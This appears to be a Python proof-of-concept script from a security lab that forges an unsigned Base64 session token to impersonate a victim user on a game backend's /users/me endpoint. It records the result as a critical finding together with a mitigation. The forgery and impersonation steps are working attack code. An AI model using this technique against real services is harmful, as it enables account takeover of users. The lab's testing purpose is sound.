from common import (
    create_client,
    login,
    auth_headers,
    forge_demo_token,
    write_finding,
    print_title,
    print_result,
    ATTACKER_TICKET,
    VICTIM_TICKET
)


def run_weak_token_impersonation_attack() -> bool:
    """
    prueba una suplantacion usando un token debil.

    como el token solo es base64(json), puedo fabricar uno nuevo con los datos
    de la victima y comprobar si el backend lo acepta.

    si /users/me devuelve el perfil de la victima, la suplantacion funciona.
    """

    print_title("WEAK TOKEN IMPERSONATION ATTACK - Base64 Token Forgery")

    with create_client() as client:
        #entro como atacante para tener una sesion normal del lab
        attacker = login(client, ATTACKER_TICKET)
        attacker_id = attacker["user_id"]

        print(f"Attacker user_id: {attacker_id}")

        #tambien entro como victima porque en el lab necesito sus datos para la demo
        #en la vida real esos datos saldrian de otra fuga o de enumerar usuarios
        victim = login(client, VICTIM_TICKET)
        victim_id = victim["user_id"]
        victim_steam_id = victim["steam_id"]

        print(f"Victim user_id: {victim_id}")
        print(f"Victim steam_id: {victim_steam_id}")

        #fabrico un token falso con la identidad de la victima
        #esto solo funciona porque el token no esta firmado
        forged_token = forge_demo_token(
            user_id=victim_id,
            steam_id=victim_steam_id
        )

        print(f"Forged token generated for victim user_id: {victim_id}")

        #uso el token falso en /users/me para ver si el backend me cree
        response = client.get(
            "/users/me",
            headers=auth_headers(forged_token)
        )

        status_code = response.status_code

        try:
            body = response.json()
        except Exception:
            body = {}

        #si responde 200 y el id es el de la victima, la suplantacion esta hecha
        impersonation_confirmed = (
            status_code == 200
            and body.get("id") == victim_id
        )

        print_result(
            impersonation_confirmed,
            "Backend accepted forged token and returned victim profile"
        )

        #guardo la evidencia para que el informe pueda reconstruir el ataque
        write_finding(
            vulnerability="Weak Token Integrity / User Impersonation",
            severity="Critical",
            endpoint="/users/me",
            owasp_category="API2:2023 Broken Authentication",
            confirmed=impersonation_confirmed,
            evidence={
                "attacker_user_id": attacker_id,
                "victim_user_id": victim_id,
                "victim_steam_id": victim_steam_id,
                "status_code": status_code,
                "response_body": body
            },
            mitigation=(
                "Replace unsigned Base64 tokens with signed JWTs or server-side "
                "sessions. In a real Steamworks integration, validate the Steam "
                "ticket server-side against Steam Web API and generate a signed "
                "session token with expiration."
            )
        )

        return impersonation_confirmed


if __name__ == "__main__":
    success = run_weak_token_impersonation_attack()
    raise SystemExit(0 if success else 1)
